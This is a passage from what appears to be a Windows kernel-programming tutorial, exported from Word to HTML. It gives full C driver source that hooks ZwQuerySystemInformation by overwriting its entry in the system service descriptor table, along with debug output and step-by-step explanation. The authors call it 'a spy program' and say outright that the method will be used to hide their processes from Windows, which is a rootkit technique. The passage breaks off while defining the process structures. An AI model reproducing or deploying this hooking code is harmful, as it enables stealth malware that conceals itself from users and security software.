mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>no = *(long *)p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>OldZwQuerySystemInformation=
KeServiceDescriptorTable. ServiceTableBase [no];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;OldZwQuerySystemInformation=%x
NewZwQuerySystemInformation=%x
NumberOfServices=%d&quot;,OldZwQuerySystemInformation,NewZwQuerySystemInformation,KeServiceDescriptorTable.NumberOfServices);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Three
tables %x %x
%x&quot;,KeServiceDescriptorTable.ServiceTableBase,KeServiceDescriptorTable.
ServiceCounterTableBase,KeServiceDescriptorTable.ParamTableBase);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm cli<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)NewZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm sti<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Vijay 2
KeServiceDescriptorTable=804742b8<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>OldZwQuerySystemInformation
=80493b5b NewZwQuerySystemInformation = eb749000 NumberOfServices=248<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Three tables 804742b8
0 8047469c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc=0 Class=2
Length=312 return=0<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc=0 Class=55
Length=4 return=0<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc=0 Class=0
Length=44 return=0<o:p></o:p></span></p>

<pre><span style='mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style";
mso-fareast-font-family:"Times New Roman"'>rc=0 Class=50 Length=4 return=0<o:p></o:p></span></pre>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
program you will like. We are actually writing a spy program that hooks a
certain function. In this case it is the undocumented function
ZwQuerySystemInformation. Anytime someone calls this functions, our code will
get called. If you see the output, you will realize that the function gets
called lots of times and we will use this method to hide our processes from
windows.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
the DriverEntry function we start as usual by setting p to the address of
function ZwQuerySystemInformation and extract the service number of the
function. The exported variable KeServiceDescriptorTable is actually a
structure that we take as an instance of sdt. This data type is made up of
three pointers and a number. The first pointer ServiceTableBase is actually the
start of an array of pointers to functions. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
number stored after the first byte is actually an offset into this array which
gives us the address of the function to be called. In the case of
ZwQuerySystemInformation, GetProcAddress returns a value of 77f87d11. The offset
of 151 from this array has a value 80493b5b. This is where the code for the
function actually resides. We store this value in a variable
OldZwQuerySystemInformation. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
variable is defined as pointer to a stdcall function that takes three
parameters. We print out the members of the structure KeServiceDescriptorTable
so that we realize that the second pointer ServiceCounterTableBase is 0. The
number of services or address of functions in the table is 248. We have created
a function NewZwQuerySystemInformation in our driver and as we are in kernel
space it has a value pf eb749000. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Now
each time someone calls the function ZwQuerySystemInformation we would like our
code to be called. Thus we set the 151<sup>st</sup> member of the array to the
address of our function NewZwQuerySystemInformation. The only problem is that
interrupts keep occurring all the time. When we are overwriting an entry in
service table array, we will overwrite a byte at a time. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>If
two of the four bytes have been changed, an interrupt occurs and then someone
calls the ZwQuerySystemInformation function, the wrong one will be called and
havoc will result. Thus the best way to solve this problem is to stop all
interrupts using the assembler instruction cli and after we have changed the
value we use the sti instruction. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>If
you do not maybe nothing happens, but we have seen the blue screen of death too
many times.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
the function NewZwQuerySystemInformation we simply call the original function
whose address we have in the variable OldZwQuerySystemInformation. We then
display the Class. Length and return length variables. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
function gets called with four parameters which we will soon explain. Whatever
value was returned to us we return it back. This function gets called very
often as the output shows us. Thus all that we have done in the above example
is simple. We found the address of the actual function that gets called, stored
it in the variable OldZwQuerySystemInformation and placed the address of our
function NewZwQuerySystemInformation in the array of functions. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Each
time somebody called the function ZwQuerySystemInformation our function gets
called and now we call the original. We will use this to control the output
that other programs who call the function ZwQuerySystemInformation receive. In
driver load we have to set the 151<sup>st</sup> array member back to the value
we saved in the variable OldZwQuerySystemInformation and we debar interrupts
while this is happening.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P42<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSYSAPI NTSTATUS NTAPI
ZwQuerySystemInformation(ULONG SystemInformationClass,PVOID
SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef struct <o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceCounterTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
NumberOfServices;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned char
*ParamTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>} sdt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__declspec(dllimport)
sdt KeServiceDescriptorTable;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef NTSTATUS
(*qtype)(ULONG SystemInformationCLass,PVOID SystemInformation,ULONG
SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>qtype
OldZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
NewZwQuerySystemInformation(ULONG SystemInformationClass,PVOID
SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS rc;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc =
OldZwQuerySystemInformation
(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;rc=%d
Class=%d Length=%d
return=%x&quot;,rc,SystemInformationClass,SystemInformationLength,ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return rc;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long no;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm cli<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)OldZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm sti<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS DriverEntry(PDRIVER_OBJECT
driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char *p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2 KeServiceDescriptorTable=%x&quot;,KeServiceDescriptorTable);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = (char
*)ZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = p + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>no = *(long *)p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>OldZwQuerySystemInformation=(qtype)KeServiceDescriptorTable.ServiceTableBase[no];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm cli<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)NewZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm sti<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
program is more for the purists who hate see the compiler spew out warnings.
The world of C we like because it does not complain too much whenever we have a
pointer mismatch. Pointers on both sides of the equal to sign have to be of the
same data type. We start with creating a typedef qtype which is a pointer to a
_stdcall function that takes up 4 parameters. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
is the same number that ZwQuerySystemInformation takes. We then create a
pointer OldZwQuerySystemInformation that is now in instance of qtype and not a
pointer to a function etc as specified before. Where this helps is when we are
initializing the variable OldZwQuerySystemInformation we simply use the word
qtype as a cast. We believe the above program serves no useful purpose, but we
can also write code that the compiler passes.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P43<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSYSAPI NTSTATUS
NTAPI ZwQuerySystemInformation(ULONG SystemInformationClass,PVOID SystemInformation,ULONG
SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef struct <o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceCounterTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
NumberOfServices;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned char
*ParamTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>} sdt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__declspec(dllimport)
sdt KeServiceDescriptorTable;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef NTSTATUS
(*qtype)(ULONG SystemInformationCLass,PVOID SystemInformation,ULONG
SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>qtype
OldZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
_SYSTEM_THREADS<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>KernelTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>UserTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER<span
style="mso-spacerun: yes">   </span>CreateTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>WaitTime;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PVOID<span
style="mso-spacerun: yes">   </span>StartAddress;<span style="mso-spacerun:
yes">                </span><o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>CLIENT_ID<span
style="mso-spacerun: yes">       </span>ClientIs;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KPRIORITY<span
style="mso-spacerun: yes">       </span>Priority;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KPRIORITY<span
style="mso-spacerun: yes">       </span>BasePriority;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>ContextSwitchCount;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>ThreadState;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KWAIT_REASON<span
style="mso-spacerun: yes">    </span>WaitReason;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>};<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
_SYSTEM_PROCESSES<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>NextEntryDelta;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>ThreadCount;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ULONG<span
style="mso-spacerun: yes">   </span>Reserved[6];<o:p></o:p></span></p>

